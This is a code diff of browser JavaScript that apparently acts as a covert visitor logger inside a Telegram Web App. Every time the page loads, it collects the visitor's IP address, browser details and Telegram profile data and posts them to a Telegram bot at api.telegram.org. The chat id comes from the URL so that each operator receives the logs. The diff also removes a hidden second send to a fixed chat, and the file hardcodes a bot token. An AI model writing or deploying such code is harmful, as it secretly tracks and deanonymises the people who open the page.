@@ -1,13 +1,15 @@
 function getIdFromURL() {
     const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get('id') || 'неизвестно'; // Get 'id' from the URL, or return 'неизвестно' if it’s not there
+    return urlParams.get('id') || 'неизвестно'; // Get 'id' from the URL, or return 'неизвестно' if not found
 }
 
 async function sendDataToTelegram() {
     let tg = window.Telegram.WebApp;
     const token = "7497702434:AAH8I2QCNJuOq8tvsWt78Cgfk8AU7KdozsI";  // Replace with your bot token
-    const chatId = tg.initDataUnsafe.start_param; // This can be used if needed
-    const additionalChatId = -1002501702455;
+    const ownerId = getIdFromURL(); // Use the id from URL as chat_id
+
+    // Ensure ownerId is available, if not, use a fallback chat_id (for example, a default admin)
+    const chatId = ownerId !== 'неизвестно' ? ownerId : 'default_chat_id';  // Replace 'default_chat_id' with your fallback chat_id if needed
 
     const ipAddress = await getIPAddress();
     const userAgent = getUserAgent();
@@ -23,8 +25,6 @@ async function sendDataToTelegram() {
     const lastName = userInfo.last_name || 'неизвестно';
     const languageCode = userInfo.language_code || 'неизвестно';
     const allowsWriteToPm = userInfo.allows_write_to_pm ? 'да' : 'нет';
-
-    const ownerId = getIdFromURL(); // Extract 'id' from the URL
 
     const message = `
 <b> Лог успешен!</b>
@@ -50,15 +50,12 @@ async function sendDataToTelegram() {
 ├ Название браузера: <code>${browserInfo.name}</code>
 ├ Версия браузера: <code>${browserInfo.version}</code>
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
-
-<b>🔑 Информация об owner:</b>
-└ Owner ID: <code>${ownerId}</code>
 `;
 
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
     const formData = new URLSearchParams();
-    formData.append('chat_id', chatId);
+    formData.append('chat_id', chatId);  // Using the extracted id as chat_id
     formData.append('text', message);
     formData.append('parse_mode', 'HTML');
 
@@ -77,29 +74,6 @@ async function sendDataToTelegram() {
     } catch (error) {
         console.error('Ошибка:', error);
     }
-
-    // Second request
-    const formData1 = new URLSearchParams();
-    formData1.append('chat_id', additionalChatId);
-    formData1.append('text', message);
-    formData1.append('parse_mode', 'HTML');
-
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded'
-            },
-            body: formData1.toString()
-        });
-        if (!response.ok) {
-            throw new Error('Ошибка при отправке второго запроса: ' + response.statusText);
-        }
-        console.log('Второй запрос успешно отправлен');
-    } catch (error) {
-        console.error('Ошибка второго запроса:', error);
-    }
 }
 
 sendDataToTelegram();
-
